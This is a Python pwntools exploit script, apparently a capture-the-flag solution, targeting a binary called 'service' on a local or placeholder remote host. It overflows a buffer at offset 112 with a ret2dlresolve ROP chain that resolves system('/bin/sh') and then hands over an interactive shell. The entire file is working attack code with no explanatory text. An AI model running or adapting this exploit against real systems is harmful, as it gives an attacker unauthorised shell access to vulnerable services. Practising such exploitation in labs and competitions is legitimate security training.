#!/usr/bin/env python3

from pwn import *

exe = ELF("./service")

context.binary = exe
context.terminal = ['konsole', '-e']

def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote('XXX.XXX.XXX.XXX', 00000)

    return r


def main():
    r = conn()
    r.recvuntil(':')
    r.recvline()
    
    offset = 112

    rop = ROP(exe)
    dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])
    rop.read(0, dlresolve.data_addr)
    rop.ret2dlresolve(dlresolve)
    raw_rop = rop.chain()

    r.sendline(flat({offset: bytes(rop)}))
    r.sendline(dlresolve.payload)
    r.interactive()


if __name__ == "__main__":
    main()

